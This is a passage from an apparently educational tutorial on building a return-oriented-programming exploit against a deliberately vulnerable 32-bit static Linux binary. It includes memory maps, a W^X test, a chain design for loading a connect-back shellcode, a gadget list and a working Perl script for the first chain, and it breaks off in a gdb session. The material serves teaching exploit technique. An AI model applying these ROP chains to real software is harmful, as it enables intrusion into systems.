</pre>
         <p>
          The system log journal shows the correct overwrite of the return address of
the
          <code>
           foo()
          </code>
          function.
         </p>
         <pre class="bb">
# journalctl -f
Jan 11 02:05:20 solid kernel: StackBasedOverf[2812]: <b class="ca">segfault at deadbeef ip 00000000deadbeef</b> sp 00000000ffba8c80 error 14
</pre>
         <h2 id="6-exploitation-surface">
          6 - Exploitation Surface
         </h2>
         <hr/>
         <p>
          Now, a vulnerability can be triggered via a stack buffer overflow
and the execution flow of the process hijacked, this section
shows what to exploit in the process.
         </p>
         <p>
          In the scenario designed here, the vulnerable binary
is executed in a 32 bit GNU/Linux environment protected by the W^X and the
ASLR protections. How effective are these two protections in this scenario?
         </p>
         <p>
          The vulnerable program is designed to sleep 20 seconds when it is called without
argument. This behaviour is helpful to analyse the program memory map. Below
the program is executed in background two times and
the
          <code>
           /proc/${!}/maps
          </code>
          shows the process memory map of the resulting process.
         </p>
         <pre class="bb">
$ ./StackBasedOverflow &amp; cat /proc/${!}/maps
[3] 5556
<b class="ca">08048000-080ec000</b> r-xp 00000000 fe:00 22418444      /home/snake/StackBasedOverflow
<b class="ca">080ec000-080ee000</b> rw-p 000a3000 fe:00 22418444      /home/snake/StackBasedOverflow
<b class="ca">080ee000-080ef000</b> rw-p 00000000 00:00 0
08ab0000-08ad2000 rw-p 00000000 00:00 0             [heap]
f7728000-f772b000 r--p 00000000 00:00 0             [vvar]
f772b000-f772d000 r-xp 00000000 00:00 0             [vdso]
ffbb6000-ffbd7000 rw-p 00000000 00:00 0             [stack]
$ ./StackBasedOverflow &amp; cat /proc/${!}/maps
[4] 5558
<b class="ca">08048000-080ec000</b> r-xp 00000000 fe:00 22418444      /home/snake/StackBasedOverflow
<b class="ca">080ec000-080ee000</b> rw-p 000a3000 fe:00 22418444      /home/snake/StackBasedOverflow
<b class="ca">080ee000-080ef000</b> rw-p 00000000 00:00 0
089b9000-089db000 rw-p 00000000 00:00 0             [heap]
f7789000-f778c000 r--p 00000000 00:00 0             [vvar]
f778c000-f778e000 r-xp 00000000 00:00 0             [vdso]
ffe45000-ffe66000 rw-p 00000000 00:00 0             [stack]
</pre>
         <p>
          Concerning the ASLR protection, as show in red in the previous output, there are
segments loaded at a fixed predictable
address between two execution, and one of this segment it flagged as executable.
So, the ASLR seems to not work correctly in this scenario, the protection impacts
only the heap, vvar, vdso and the stack segments. This behaviour is induce by
a bad integration of the ASLR with the binary. The program is compiled
with the
          <code>
           -static
          </code>
          switch which produce a position dependante executable
file, the side effects of this parameters induce that
the executable code can't be mapped at random base address.
This option has been voluntarily selected to introduce a vulnerable
surface in the binary. This problem can be overcome here
with the
          <code>
           -static-pie
          </code>
          option.
         </p>
         <p>
          Concerning the W^X protection the previous output shows that
all the segments of the process are mapped as write or
execute but not both. So, the W^X protection
work correctly concerning the mapping of the binary in memory.
An another side to check concerning the W^X protection,
is to check if the three important restrictions W^X, X!-&gt;W and W!-&gt;X
about a memory mapping are respected.
To test these restrictions a
little program
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/w_xor_x_test.c" style="text-decoration: none" target="_blank">
           w_xor_x_test.c [10]
          </a>
          ,
I have written C available
on my github repository is used, It tests if the expected restrictions on
creation and modification of a memory mapping are respected
by the implementaion of the
          <code>
           mmap()
          </code>
          and
          <code>
           mprotect()
          </code>
          syscalls.
         </p>
         <pre class="bb">
$ gcc -m32 -z noexecstack w_xor_x_test.c
$ ./w_xor_x_test
[i] Test x^w
      [+] New W+X memory page at 0xf7fdd000.
      [+] WRITE memory page code has succeeded.
      [+] EXECUTE memory page code has succeeded.
      [+] Executable code successfully executed.
[i] Test W-&gt;X
      [+] New W memory page at 0xf7fdc000.
      [+] WRITE memory page code has succeeded.
      [+] Change memory page permission to X.
      [+] EXECUTE memory page code has succeeded.
      [+] Executable code successfully executed.
[i] Test x-&gt;w
      [+] New X memory page at 0xf7fdb000.
      [+] Change memory page permission to W.
      [+] WRITE memory page code has succeeded.
</pre>
         <p>
          The output shows that a memory page can be created with the W+X protections.
By default without any patch, Linux allows this behaviour,
due to the principal need of the JIT
(just in time compilation) for the interpreted languages.
So, this induce that an executable code can be added in the
process address space at runtime.
         </p>
         <p>
          So, the exploitation conditions are the following.
         </p>
         <ul>
          <li>
           The instruction pointer can be hijacked.
          </li>
          <li>
           The stack can be written.
          </li>
          <li>
           A segment with the execute flag (.text section) is loaded at a predictable address.
          </li>
          <li>
           A segment with the write flag is loaded at a predictable address.
          </li>
          <li>
           A memory page with W+X protections can be mapped in memory, writted and executed.
          </li>
         </ul>
         <p>
          This set of conditions allow to write an exploit which use the ROP
technique to load and execute a shellcode. The next section of this
paper shows how to write it.
         </p>
         <h2 id="7-exploit-writing">
          7 - Exploit Writing
         </h2>
         <hr/>
         <h3 id="71-design">
          7.1 - Design
         </h3>
         <p>
          As show in the previous section the executable code of the vulnerable program
exemple is loaded at a
predictable base address at each new execution, the execution flow of
the process can be hijacked and the stack is controlled, so all this conditions
will be used to write a ROP based exploit. The exploit exposes here
will use the weakness in the default Linux implementation of the W^X protection
to inject a shellcode in the process and execute it. Then the shellcode
will realise the more complexes operations like
opening a socket, start a shell... its the brain of this payload.
The following schema shows the structure of the exploit.
         </p>
         <pre class="h" style="font-size: 9px; font-weight: bold;">
        +-------------------+
        |                   |
        |    ROP CHAIN 1    |
        |                   |
        |       W + X       |
        |                   |
        |  memory mapping   |
        |                   |
        +-------------------+
        |                   |
        |    ROP CHAIN 2    |
        |                   |
        |  shellcode loader |
        |         +         |
        |     embedded      |
        |     shellcode     |
        |                   |
        +-------------------+
        |                   |
        |    ROP CHAIN 3    |
        |                   |
        |  shellcode caller |
        |                   |
        +-------------------+
</pre>
         <p>
          The part named
          <code>
           ROP CHAIN 1
          </code>
          , is responsible for mapping
a new memory aera in the proccess address space with the
writeable and the executable protection access, via the
          <code>
           mmap()
          </code>
          syscall,
as show in the previous section Linux allows
this behaviour by default.
         </p>
         <p>
          The second part named
          <code>
           ROP CHAIN 2
          </code>
          , is responsible
for loading an embedded shellcode in the
new memory mapping created by
          <code>
           ROP CHAIN 1
          </code>
          .
         </p>
         <p>
          The third part named
          <code>
           ROP CHAIN 3
          </code>
          , is responsible
for redirecting the execution path at the start address of
the new memory mapping created by
          <code>
           ROP CHAIN 1
          </code>
          , in
order to execute the shellcode loaded in this area by
          <code>
           ROP CHAIN 2
          </code>
          .
Then, the loaded shellcode is executed, here a connect back shellcode is used.
         </p>
         <p>
          Every parts of this payload named
          <code>
           ROP CHAIN *
          </code>
          are
implemented in ROP based on code reuse.
The embedded shellcode is a classic shellcode written in ASM.
This paper introduces only the creation of the part in ROP.
The shellcode designing is not considered here.
         </p>
         <pre class="h" style="font-size: 8px; font-weight: bold;">

 1)     Low addresses                           2)     Low addresses                           3)     Low addresses
      |----------------|                             |----------------|                             |----------------|
      |                |                             |                |                             |                |
      |                |                       <b class="ce">eip</b>--&gt;|                |                             |                |
      |      .text     |                             |      .text     |                             |      .text     |
      |                |                             |                |                             |                |
<b class="ce">eip</b>--&gt;|                |                             |                |                             |                |
      |----------------|                             |----------------|                             |----------------|
      |      .data     |                             |      .data     |                             |      .data     |
      |----------------|                             |----------------|                             |----------------|
      |      .bss      |                             |      .bss      |                             |      .bss      |
      |----------------|                             |----------------|                             |----------------|
      |                |                             |                |                             |                |
      |      .heap     |                             |      .heap     |                             |      .heap     |
      |                |                             |                |                             |                |
      |----------------|                             |----------------|                             |----------------|
      |                |                             |                |                             |                |
      |----------------|                             |----------------|                       <b class="ce">eip</b>--&gt;|----------------|
      |<b class="cd">   new memory   </b>|                             |<b class="ca">     loaded     </b>|&lt;-------                     |<b class="ca">     loaded     </b>|&lt;-------
      |<b class="cd">      area      </b>|&lt;-------                     |<b class="ca">    shellcode   </b>|       |                     |<b class="ca">    shellcode   </b>|       |
      |<b class="cd">       RWX      </b>|       |                     |<b class="ca">                </b>|       |                     |<b class="ca">                </b>|       |
      |----------------|       |                     |----------------|       |                     |----------------|       |
      |                |  creating new               |                |     loading                 |                |   redirecting
      |                |  memory area                |                |    shellcode                |                |      eip
      |                |       |                     |                |       |                     |                |       |
      |----------------|       |                     |----------------|       |                     |----------------|       |
      |                |       |                     |                |       |                     |                |       |
      |  ROP CHAIN 1   |--------                     |  ROP CHAIN 1   |       |                     |  ROP CHAIN 1   |       |
      |                |                             |                |       |                     |                |       |
<b class="ca">esp</b>--&gt;|----------------|                             |----------------|       |                     |----------------|       |
      |                |                             |                |       |                     |                |       |
      |  ROP CHAIN 2   |                             |  ROP CHAIN 2   |--------                     |  ROP CHAIN 2   |       |
      |       +        |                             |        +       |                             |        +       |       |
      |    shellcode   |                             |    shellcode   |                             |    shellcode   |       |
      |----------------|                       <b class="ca">esp</b>--&gt;|----------------|                             |----------------|       |
      |                |                             |                |                             |                |       |
      |  ROP CHAIN 3   |                             |  ROP CHAIN 3   |                             |  ROP CHAIN 3   |--------
      |                |                             |                |                             |                |
      |----------------|                             |----------------|                       <b class="ca">esp</b>--&gt;|----------------|
        High addresses                                 High addresses                                 High addresses
</pre>
         <h3 id="72-rop-chain-1-create-a-new-wx-region">
          7.2 - ROP CHAIN 1: Create a New W+X Region
         </h3>
         <h4 id="721-mmap-syscall-overwiew">
          7.2.1 - mmap Syscall Overwiew
         </h4>
         <p>
          The unic way to create memory with protection access on Linux is
through the
          <code>
           mmap
          </code>
          syscall.
Below, the
          <code>
           mmap()
          </code>
          interface provides by the GLIBC, documented in the man 2.
         </p>
         <pre class="bb">
MMAP(2)

  void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
</pre>
         <p>
          The
          <code>
           addr
          </code>
          and the
          <code>
           length
          </code>
          arguments allow to specify the
start address of the new memory area and its size.
If the
          <code>
           addr
          </code>
          parameter is NULL, the kernel selects
the address to create it.
Here, this last feature is used and allows to overcome
of any hard-coded memory address and so, to benefit
from some portability.
The
          <code>
           length
          </code>
          parameter will be fixed to 96 (0x60) bytes
which is the size of the shellcode used in the next steps.
         </p>
         <p>
          The flags parameters will be set with the combination
of the
          <code>
           MAP_PRIVATE
          </code>
          and
          <code>
           MAP_ANONYMOUS
          </code>
          constant
which allows to create a new empty memory mapping
which will be not backed by any file and which will not share
with other processes.
         </p>
         <p>
          The
          <code>
           prot
          </code>
          parameter will be set with the combination oh the
          <code>
           PROT_WRITE
          </code>
          and
          <code>
           PROT_EXEC
          </code>
          constants to mark the new memory area
with the write and execute access.
         </p>
         <p>
          Below, the
          <code>
           mmap()
          </code>
          function completed with the
necessary values for the exploit write here in order
to create a new memory area with the
W+X protectections access.
         </p>
         <pre class="bb">
mmap(NULL, 96, PROT_EXEC|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, NULL);
</pre>
         <p>
          Then, a tiny program is use to provides the values of
the combined constants
          <code>
           PROT_EXEC|PROT_WRITE
          </code>
          and
          <code>
           MAP_ANONYMOUS|MAP_PRIVATE
          </code>
          .
         </p>
         <div class="a">
          <pre><span></span><code><span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;sys/mman.h&gt;</span>
<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdio.h&gt;</span>
<span class="dg">void</span><span class="fv"> </span><span class="ek">main</span><span class="ft">(</span><span class="dg">void</span><span class="ft">)</span>
<span class="ft">{</span>
<span class="fv">    </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"PROT_EXEC | PROT_WRITE: 0x%x</span><span class="ef">\n</span><span class="fu">MAP_ANONYMOUS | MAP_PRIVATE: 0x%x</span><span class="ef">\n</span><span class="fu">"</span><span class="ft">,</span>
<span class="fv">                    </span><span class="fo">PROT_EXEC</span><span class="fp">|</span><span class="fo">PROT_WRITE</span><span class="ft">,</span><span class="fv"> </span><span class="fo">MAP_ANONYMOUS</span><span class="fp">|</span><span class="fo">MAP_PRIVATE</span><span class="ft">);</span>
<span class="ft">}</span>
</code></pre>
         </div>
         <pre class="bb">
$ gcc -m32 mmap_args.c -o mmap_args
$ ./mmap_args
PROT_EXEC | PROT_WRITE: 0x6
MAP_ANONYMOUS | MAP_PRIVATE: 0x22
</pre>
         <p>
          The system call number assigned to
          <code>
           mmap
          </code>
          is available in the
kernel source
          <code>
           arch/x86/syscalls/syscall_32.tbl
          </code>
          or in
the kernel header
          <code>
           /usr/include/asm/unistd_32.h
          </code>
          .
         </p>
         <pre class="bb">
$ cat /usr/include/asm/unistd_32.h | grep mmap
#define __NR_mmap 90
#define __NR_mmap2 192
</pre>
         <p>
          The output shows there are two
          <code>
           mmap
          </code>
          syscall provides
by the linux kernel. The
          <code>
           MMAP(2)
          </code>
          manual of the
          <code>
           mmap()
          </code>
          interface provides by the GLIBC for the
          <code>
           mmap
          </code>
          syscall
supplies the following informations.
         </p>
         <pre class="bb">
MMAP(2)

C library/kernel differences

This page describes the interface provided by the glibc mmap() wrapper function. Originally, this function inv-oked a system call of the same name.  Since kernel 2.4, that system call has been superseded by mmap2(2), and nowadays the glibc mmap() wrapper function invokes mmap2(2) with a suitably adjusted value for offset.
</pre>
         <p>
          In fact, the
          <code>
           mmap()
          </code>
          wrapper of the GLIBC performs the
mmap2 syscall by adjusting the value of the
          <code>
           offset
          </code>
          argument.
Here, the
          <code>
           MAP_ANONYMOUS
          </code>
          constant is used for the
          <code>
           prot
          </code>
          argument and
induces that the
          <code>
           offset
          </code>
          argument is ignored,
so this work doesn't need to do to invoke the mmap2 syscall.
         </p>
         <p>
          The exploit write here use the mmap2 syscall,
but mmap is yet available and it
has been tested successfully in parallel. The main difference between
the two syscalls is the method use to pass the arguments to the syscall.
For mmap2, the arguments are passed in the registers of
the processor, whereas for mmap, the arguments are store in a data
structure and only a pointer to this structure
is passed in the
          <code>
           eax
          </code>
          register. The version of
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_mmap.pl" style="text-decoration: none" target="_blank">
           this payload with mmap [8]
          </a>
          is available on my GitHub repository. It is significantly larger and complexe than the version with mmap2, that is why this paper expose the version with mmap2.
         </p>
         <p>
          Finally, the operations to realize in the
          <code>
           ROP CHAIN 1
          </code>
          to perform the mmap2
syscall are the following, according to the x86 Linux calling convention:
         </p>
         <ul>
          <li>
           Put the values
           <code>
            0x0
           </code>
           ,
           <code>
            0x60
           </code>
           ,
           <code>
            0x6
           </code>
           ,
           <code>
            0x22
           </code>
           ,
           <code>
            0xffffffff
           </code>
           ,
           <code>
            0x0
           </code>
           of the mmap2 arguments respectively in the registers
           <code>
            ebx
           </code>
           ,
           <code>
            ecx
           </code>
           ,
           <code>
            edx
           </code>
           ,
           <code>
            esi
           </code>
           ,
           <code>
            edi
           </code>
           and
           <code>
            ebp
           </code>
           .
          </li>
          <li>
           Put the value
           <code>
            0xc0
           </code>
           of the mmap2 syscall in the
           <code>
            eax
           </code>
           register.
          </li>
          <li>
           Call the
           <code>
            int $0x80
           </code>
           instruction to switch in kernel mode to execute the mmap2 syscall.
          </li>
         </ul>
         <h4 id="722-build">
          7.2.2 - Build
         </h4>
         <p>
          The dedicated tool
          <a href="https://github.com/JonathanSalwan/ROPgadget" style="text-decoration: none" target="_blank">
           <em>
            ROPgadget
           </em>
           [2]
          </a>
          is used here to extract
the available gadgets in the executable section of the vulnerable program sample.
         </p>
         <pre class="bb">
$ ROPgadget --binary StackBasedOverflow &gt; gadgets_list.txt
</pre>
         <p>
          The first time, finding a sequence of gadgets to perform the desired
task can take a lot of time. One approach, consists in filtering the
output of the gadget extractor used in order to
find the required gadgets to fill the CPU registers with
the right values.
Then, it's possible to optimise it manualy. Below, the selectionned gadgets
to realize the mmap2 syscall, after some manual optimization.
         </p>
         <pre class="bb">
0x080481a9 : pop ebx ; ret
0x080db9df : pop ecx ; ret
0x0806ed4a : pop edx ; ret
0x08048480 : pop edi ; ret
0x080483e6 : pop ebp ; ret
0x080b9526 : pop eax ; ret
0x080d8b3d : inc ebx ; ret
0x0805c9f7 : inc edx ; ret
0x0806c09c : inc ebp ; ret
0x0805c05f : mov esi, edx ; ret
0x0805429c : sub eax, edx ; ret
0x0806f490 : int 0x80 ; ret
0x0809c5a2 : sub ecx, edx ; not eax ; and eax, ecx ; ret
0x0809c5e3 : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret
</pre>
         <p>
          Below, the resulting script which builds
          <code>
           ROP CHAIN 1
          </code>
          and
prints it to the standard output. The operations performs by
          <code>
           ROP CHAIN 1
          </code>
          are very straightforward to understand.
It overflows 32 bits values to obtain some registers to zero
and performs subtractions to obtain registers to a specific values,
then it performs the
          <code>
           int 0x80
          </code>
          interruption to invoke the mmap2 syscall.
         </p>
         <p>
          <a href="https://github.com/VincentDary/rop-with-shellcode/blob/master/rop_chain_1.pl" style="text-decoration: none" target="_blank">
           <b>
            <em>
             rop_chain_1.pl
            </em>
           </b>
          </a>
         </p>
         <div class="a">
          <pre><span></span><code><span class="dk">#!/usr/bin/perl</span>

<span class="fk">use</span><span class="fv"> </span><span class="eh">strict</span><span class="ft">;</span>
<span class="fk">use</span><span class="fv"> </span><span class="eh">warnings</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$binary_name</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"StackBasedOverflow"</span><span class="ft">;</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">524</span><span class="ft">;</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$buffer</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">""</span><span class="ft">;</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xff\xff\xff\xff"</span><span class="ft">;</span>

<span class="di"># gadgets section</span>
<span class="di">#</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ebx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\xa9\x81\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080481a9 : pop ebx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ecx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\xdf\xb9\x0d\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080db9df : pop ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\x4a\xed\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806ed4a : pop edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_edi</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\x80\x84\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x08048480 : pop edi ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_ebp</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\xe6\x83\x04\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080483e6 : pop ebp ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\x26\x95\x0b\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080b9526 : pop eax ; ret</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_ebx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\x3d\x8b\x0d\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x080d8b3d : inc ebx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\xf7\xc9\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805c9f7 : inc edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$inc_ebp</span><span class="fv"> </span><span class="fp">=</span><span class="fv">     </span><span class="fu">"\x9c\xc0\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806c09c : inc ebp ; ret</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$mov_esi_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\x5f\xc0\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805c05f : mov esi, edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_eax_edx</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\x9c\x42\x05\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0805429c : sub eax, edx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$int_80</span><span class="fv"> </span><span class="fp">=</span><span class="fv">      </span><span class="fu">"\x90\xf4\x06\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0806f490 : int 0x80 ; ret</span>

<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_ecx_edx__not_eax__and_eax_ecx</span><span class="fv">      </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xa2\xc5\x09\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0809c5a2 : sub ecx, edx ; not eax ; and eax, ecx ; ret</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$sub_edx_eax__mov_eax_edx__sar_eax_0x10</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"\xe3\xc5\x09\x08"</span><span class="ft">;</span><span class="fv">  </span><span class="di"># 0x0809c5e3 : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret</span>


<span class="di"># set the stack padding overflow</span>
<span class="fk">my</span><span class="fv"> </span><span class="eq">$buffer</span><span class="fv">  </span><span class="fp">=</span><span class="fv">  </span><span class="fu">'A'</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eq">$padding_overflow</span><span class="ft">;</span>


<span class="di">#********************</span>
<span class="di"># memory allocator</span>
<span class="di">#********************</span>

<span class="di"># mmap(0,sizeof(shellcode),PROT_EXEC|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE,-1,0);</span>

<span class="di"># arg1 : unsigned long addr = 0</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ebx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EBX = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_ebx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EBX = 0x00000000</span>

<span class="di"># arg2 : unsigned long len = sizeof(shellcode)</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ecx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ECX = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EDX = 0xffffff9f</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\x9f\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_ecx_edx__not_eax__and_eax_ecx</span><span class="ft">;</span><span class="fv">      </span><span class="di"># ECX = 0x00000060</span>

<span class="di"># arg4 : unsigned long flags = MAP_ANONYMOUS|MAP_PRIVATE</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EAX = 0xffffffdd</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\xdd\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EDX = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_edx_eax__mov_eax_edx__sar_eax_0x10</span><span class="ft">;</span><span class="fv"> </span><span class="di"># EDX = 0x00000022</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$mov_esi_edx</span><span class="ft">;</span>

<span class="di"># arg5 : unsigned long fd = -1</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edi</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EDI = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>

<span class="di"># arg6 : unsigned long offset = 0</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_ebp</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ESI = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_ebp</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># ESI = 0x00000000</span>

<span class="di"># Set the syscall number in EAX</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_eax</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EAX = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EDX = 0xffffff3f</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="fu">"\x3f\xff\xff\xff"</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$sub_eax_edx</span><span class="ft">;</span><span class="fv">                            </span><span class="di"># EAX = 0x000000c0</span>

<span class="di"># arg3 : unsigned long prot = PROT_EXEC|PROT_WRITE</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$pop_edx</span><span class="ft">;</span><span class="fv">                                </span><span class="di"># EDX = 0xffffffff</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$ffffffff</span><span class="ft">;</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$inc_edx</span><span class="fv"> </span><span class="fo">x</span><span class="fv"> </span><span class="eb">7</span><span class="ft">;</span><span class="fv">                            </span><span class="di"># EDX = 0x00000006</span>

<span class="di"># perform the mmap2 syscall</span>
<span class="eq">$buffer</span><span class="fv"> </span><span class="fp">.=</span><span class="fv"> </span><span class="eq">$int_80</span><span class="ft">;</span><span class="fv">                                 </span><span class="di"># EAX = @new_executable_memory</span>

<span class="fk">print</span><span class="fv"> </span><span class="eq">$buffer</span><span class="ft">;</span>
</code></pre>
         </div>
         <p>
          Below, the inspection with gdb of
          <code>
           ROP CHAIN 1
          </code>
          injected in the target program.
Breakpoints are placed before and after the buffer corruption
at the
          <code>
           strcpy()
          </code>
          function call, and at the
          <code>
           ret
          </code>
          instruction of the
          <code>
           foo()
          </code>
          function.
         </p>
         <pre class="aa">
$ gdb -q StackBasedOverflow
Reading symbols from StackBasedOverflow...done.
(gdb) set disassembly-flavor intel
(gdb) x/20i *foo
   0x80488ac &lt;foo:      push   ebp
   0x80488ad &lt;foo+1&gt;:   mov    ebp,esp
   0x80488af &lt;foo+3&gt;:   sub    esp,0x208
   0x80488b5 &lt;foo+9&gt;:   sub    esp,0x4
   0x80488b8 &lt;foo+12&gt;:  push   DWORD PTR [ebp+0x8]
   0x80488bb &lt;foo+15&gt;:  lea    eax,[ebp-0x208]
   0x80488c1 &lt;foo+21&gt;:  push   eax
   0x80488c2 &lt;foo+22&gt;:  push   0x80bc748
   0x80488c7 &lt;foo+27&gt;:  call   0x804e840 &lt;printf&gt;
   0x80488cc &lt;foo+32&gt;:  add    esp,0x10
   0x80488cf &lt;foo+35&gt;:  sub    esp,0x8
   0x80488d2 &lt;foo+38&gt;:  push   DWORD PTR [ebp+0x8]
   0x80488d5 &lt;foo+41&gt;:  lea    eax,[ebp-0x208]
   0x80488db &lt;foo+47&gt;:  push   eax
   <b class="ca">0x80488dc &lt;foo+48&gt;:  call   0x80481b0</b>
   <b class="ca">0x80488e1 &lt;foo+53&gt;:  add    esp,0x10</b>
